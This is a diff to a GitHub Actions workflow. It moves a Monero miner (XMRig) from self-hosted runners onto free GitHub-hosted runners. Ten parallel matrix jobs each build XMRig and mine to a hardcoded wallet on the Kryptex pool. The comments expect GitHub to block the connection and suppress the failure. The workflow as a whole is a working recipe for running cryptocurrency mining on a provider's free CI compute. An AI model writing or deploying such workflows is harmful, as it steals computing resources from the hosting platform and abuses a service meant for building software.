@@ -1,31 +1,34 @@
-name: Mine Monero XMR - Kryptex Pool (Scale to 10+ Instances)
+name: Mine Monero XMR - 10 Parallel Instances (Hosted Runners - Test)
 
 on:
-  workflow_dispatch:  # Manual trigger (or add schedule if you want auto-restart)
+  workflow_dispatch:  # Manual trigger (click "Run workflow" in Actions tab)
 
 jobs:
-  mine-monero:
-    runs-on: [self-hosted, miner]  # All your miners should have this label (add during runner setup)
+  mine:
+    runs-on: ubuntu-latest  # Free GitHub-hosted runner
     strategy:
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]  # Change to 20, 50 etc. for more
-      fail-fast: false  # Don't stop others if one fails
-    timeout-minutes: 10080  # 7 days – optional for long mining
+        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]  # Creates 10 parallel jobs
+      fail-fast: false  # Don't cancel others if one fails (e.g., all fail same way)
+    timeout-minutes: 360  # 6 hours max per job (GitHub limit)
 
     steps:
-      - name: Install build dependencies
+      - name: Show instance number (parallel test)
+        run: echo "Running instance ${{ matrix.instance }} on runner ${{ runner.name }}"
+
+      - name: Install dependencies
         run: |
           sudo apt-get update -y
           sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
 
-      - name: Clone and build latest XMRig
+      - name: Clone and build XMRig
         run: |
           git clone https://github.com/xmrig/xmrig.git
           mkdir xmrig/build && cd xmrig/build
           cmake .. -DWITH_HWLOC=ON -DCMAKE_BUILD_TYPE=Release
           make -j$(nproc)
 
-      - name: Create config.json with unique rig name
+      - name: Configure mining (your address + unique rig name per instance)
         run: |
           cd xmrig/build
           cat > config.json << 'EOF'
@@ -39,7 +42,7 @@ jobs:
                       "algo": "rx/0",
                       "coin": "monero",
                       "url": "xmr.kryptex.network:7029",
-                      "user": "461ys28cKUvdh7JLedMUPu7QDE5CVaSyU35QtzJ9WwFS7pk4UA8fnncD6JtANLhgDSQFWT5YSADmpV6vwZh29S769kptmTm/Miner-${{ matrix.instance }}-${{ github.run_id }}",
+                      "user": "461ys28cKUvdh7JLedMUPu7QDE5CVaSyU35QtzJ9WwFS7pk4UA8fnncD6JtANLhgDSQFWT5YSADmpV6vwZh29S769kptmTm/Instance-${{ matrix.instance }}-$(date +%s)",
                       "pass": "x",
                       "tls": false,
                       "keepalive": true,
@@ -50,7 +53,7 @@ jobs:
           }
           EOF
 
-      - name: Start mining
+      - name: Start mining (expect connection failure)
         run: |
           cd xmrig/build
-          ./xmrig --config=config.json --no-color --print-time=10
+          ./xmrig --config=config.json --no-color --print-time=10 || echo "Connection failed as expected (GitHub block)"
